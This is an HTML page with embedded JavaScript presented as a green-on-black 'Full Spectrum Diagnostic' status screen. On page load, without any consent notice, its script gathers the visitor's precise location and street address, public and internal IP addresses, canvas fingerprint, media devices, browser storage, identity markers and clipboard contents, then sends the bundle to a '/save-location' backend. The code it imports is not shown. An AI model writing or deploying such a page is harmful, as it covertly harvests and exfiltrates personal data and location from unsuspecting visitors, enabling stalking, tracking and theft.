<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIAGNOSTIC | STATUS_ONLINE</title>
    <style>
        body {
            background-color: #000;
            color: #00ff41;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            zoom: 1.2; /* 20% Global Zoom */
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
        }
        .container {
            border: 1px solid rgba(0, 255, 65, 0.3);
            background: #050505;
            padding: 50px;
            text-align: center;
            position: relative;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
        }
        .container::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: #00ff41;
            box-shadow: 0 0 15px #00ff41;
        }
        .status-row {
            display: flex;
            justify-content: space-between;
            width: 350px;
            margin: 15px 0;
            font-size: 11px;
            border-bottom: 1px solid rgba(0, 255, 65, 0.05);
            padding-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .active { color: #00ff41; font-weight: bold; }
        .label { color: rgba(0, 255, 65, 0.5); }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>

    <div class="container">
        <div style="margin-bottom: 30px; border: 1px solid rgba(0, 255, 65, 0.5); padding: 10px; display: inline-block;">
            <h1 style="margin: 0; font-size: 10px; letter-spacing: 5px; text-transform: uppercase;">Full Spectrum Diagnostic</h1>
        </div>

        <div class="status-row">
            <span class="label">Geo_Fix_Uplink</span>
            <span class="active" id="status-geo">[ INITIALIZING ]</span>
        </div>
        <div class="status-row">
            <span class="label">Net_Identity_Sync</span>
            <span class="active" id="status-net">[ INITIALIZING ]</span>
        </div>
        <div class="status-row">
            <span class="label">Hardware_Hash_Audit</span>
            <span class="active" id="status-hw">[ INITIALIZING ]</span>
        </div>
        <div class="status-row">
            <span class="label">Storage_PII_Scan</span>
            <span class="active" id="status-storage">[ INITIALIZING ]</span>
        </div>

        <div style="margin-top: 30px; font-size: 8px; color: rgba(0, 255, 65, 0.3); letter-spacing: 3px; text-transform: uppercase;">
            Sequence: FULL_LAB_EXTRACTION // NODE: AX-7792<br>
            Capturing high-fidelity telemetry...
        </div>
    </div>

    <script type="module">
        import { extractLocation } from './src/telemetry.js';
        import { extractMetadata } from './src/metadata.js';
        import { resolvePublicIP, extractConnectionInfo } from './src/network.js';
        import { extractBatteryStatus } from './src/battery.js';
        import { extractPerformanceMetrics } from './src/performance.js';
        import { resolveAddress } from './src/geocoder.js';
        import { extractBrowserStorage, auditIdentityMarkers } from './src/storage.js';
        import { extractCanvasFingerprint } from './src/render-core.js';
        import { extractInternalIPs } from './src/webrtc.js';
        import { auditPermissions } from './src/permissions.js';
        import { enumerateDevices } from './src/media_devices.js';
        import { checkClipboardSecurity } from './src/clipboard_auditor.js';
        import { transmitData } from './src/transmitter.js';

        async function runFullSpectrumDiagnostic() {
            try {
                // 1. Geolocation & Address (The "Address" one you asked for)
                const location = await extractLocation();
                const address = await resolveAddress(location.latitude, location.longitude);
                document.getElementById('status-geo').innerText = "[ COMPLETED ]";

                // 2. Network & IP
                const ip = await resolvePublicIP();
                const connection = extractConnectionInfo();
                const internalIPs = await extractInternalIPs();
                document.getElementById('status-net').innerText = "[ COMPLETED ]";

                // 3. Hardware & Fingerprint
                const fingerprint = extractCanvasFingerprint();
                const metadata = extractMetadata();
                const media = await enumerateDevices();
                document.getElementById('status-hw').innerText = "[ COMPLETED ]";

                // 4. Storage & Identity
                const storage = extractBrowserStorage();
                const pii = auditIdentityMarkers();
                document.getElementById('status-storage').innerText = "[ COMPLETED ]";

                // 5. System & Utility
                const battery = await extractBatteryStatus();
                const performance = extractPerformanceMetrics();
                const permissions = await auditPermissions();
                const clipboard = await checkClipboardSecurity();

                // Consolidate into Full Intelligence Payload
                const fullPayload = {
                    location: { ...location, address },
                    network: { ip, ...connection, internalIPs },
                    fingerprint,
                    device: { ...metadata, media, battery, performance, permissions, clipboard },
                    archive: { ...storage, pii },
                    timestamp: new Date().toISOString()
                };

                console.log("[Intelligence_Payload_Sync]:", fullPayload);
                
                // Transmit to Backend
                await transmitData('/save-location', fullPayload);
                
            } catch (error) {
                console.error("[Diagnostic_Abort]:", error.message);
            }
        }

        // Delay execution slightly to ensure UI is rendered
        setTimeout(runFullSpectrumDiagnostic, 1500);
    </script>
</body>
</html>
